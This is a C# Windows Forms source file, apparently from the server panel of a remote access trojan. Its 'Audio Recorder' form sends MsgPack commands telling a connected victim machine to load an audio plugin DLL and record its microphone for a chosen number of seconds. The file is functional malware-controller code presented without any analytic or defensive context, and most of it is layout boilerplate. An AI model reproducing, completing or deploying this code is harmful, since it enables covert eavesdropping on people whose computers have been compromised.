using System;
using System.ComponentModel;
using System.Drawing;
using System.Media;
using System.Threading;
using System.Windows.Forms;
using DevExpress.Data.Mask;
using DevExpress.Utils;
using DevExpress.XtraEditors;
using DevExpress.XtraTab;
using MessagePackLib.MessagePack;
using Server.Algorithm;
using Server.Connection;

namespace Server.Forms;

public class FormAudio : XtraForm
{
	private SoundPlayer SP = new SoundPlayer();

	private IContainer components;

	private System.Windows.Forms.Timer timer1;

	private Label label1;

	public SimpleButton btnStartStopRecord;

	private TextEdit textBox1;

	private XtraTabControl xtraTabControl1;

	private XtraTabPage xtraTabPage1;

	public FormMain F { get; set; }

	internal Clients ParentClient { get; set; }

	internal Clients Client { get; set; }

	public byte[] BytesToPlay { get; set; }

	public FormAudio()
	{
		InitializeComponent();
		base.MinimizeBox = false;
		base.MaximizeBox = false;
	}

	private void btnStartStopRecord_Click(object sender, EventArgs e)
	{
		if (textBox1.Text != null)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "audio";
			msgPack.ForcePathObject("Second").AsString = textBox1.Text;
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Audio.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
			Thread.Sleep(100);
			btnStartStopRecord.Text = "Wait...";
			btnStartStopRecord.Enabled = false;
		}
		else
		{
			MessageBox.Show("Input seconds to record.");
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!Client.TcpClient.Connected || !ParentClient.TcpClient.Connected)
			{
				Close();
			}
		}
		catch
		{
			Close();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormAudio));
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.label1 = new System.Windows.Forms.Label();
		this.btnStartStopRecord = new DevExpress.XtraEditors.SimpleButton();
		this.textBox1 = new DevExpress.XtraEditors.TextEdit();
		this.xtraTabControl1 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage1 = new DevExpress.XtraTab.XtraTabPage();
		((System.ComponentModel.ISupportInitialize)this.textBox1.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).BeginInit();
		this.xtraTabControl1.SuspendLayout();
		this.xtraTabPage1.SuspendLayout();
		base.SuspendLayout();
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(156, 33);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(46, 13);
		this.label1.TabIndex = 3;
		this.label1.Text = "seconds";
		this.btnStartStopRecord.Location = new System.Drawing.Point(64, 61);
		this.btnStartStopRecord.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnStartStopRecord.Name = "btnStartStopRecord";
		this.btnStartStopRecord.Size = new System.Drawing.Size(137, 30);
		this.btnStartStopRecord.TabIndex = 7;
		this.btnStartStopRecord.Text = "Start Recording";
		this.btnStartStopRecord.Click += new System.EventHandler(btnStartStopRecord_Click);
		this.textBox1.EditValue = "10";
		this.textBox1.Location = new System.Drawing.Point(64, 28);
		this.textBox1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.textBox1.Name = "textBox1";
		this.textBox1.Properties.MaskSettings.Set("MaskManagerType", typeof(DevExpress.Data.Mask.NumericMaskManager));
		this.textBox1.Properties.MaskSettings.Set("MaskManagerSignature", "allowNull=False");
		this.textBox1.Properties.MaskSettings.Set("mask", "d");
		this.textBox1.Size = new System.Drawing.Size(86, 28);
		this.textBox1.TabIndex = 8;
		this.xtraTabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl1.Location = new System.Drawing.Point(0, 0);
		this.xtraTabControl1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabControl1.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl1.Name = "xtraTabControl1";
		this.xtraTabControl1.SelectedTabPage = this.xtraTabPage1;
		this.xtraTabControl1.Size = new System.Drawing.Size(316, 178);
		this.xtraTabControl1.TabIndex = 9;
		this.xtraTabControl1.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[1] { this.xtraTabPage1 });
		this.xtraTabPage1.Controls.Add(this.textBox1);
		this.xtraTabPage1.Controls.Add(this.label1);
		this.xtraTabPage1.Controls.Add(this.btnStartStopRecord);
		this.xtraTabPage1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage1.Name = "xtraTabPage1";
		this.xtraTabPage1.Size = new System.Drawing.Size(314, 147);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(316, 178);
		base.Controls.Add(this.xtraTabControl1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.IconOptions.Image = (System.Drawing.Image)resources.GetObject("FormAudio.IconOptions.Image");
		base.IconOptions.ShowIcon = false;
		this.MaximumSize = new System.Drawing.Size(318, 212);
		this.MinimumSize = new System.Drawing.Size(318, 212);
		base.Name = "FormAudio";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Audio Recorder";
		((System.ComponentModel.ISupportInitialize)this.textBox1.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl1).EndInit();
		this.xtraTabControl1.ResumeLayout(false);
		this.xtraTabPage1.ResumeLayout(false);
		this.xtraTabPage1.PerformLayout();
		base.ResumeLayout(false);
	}
}
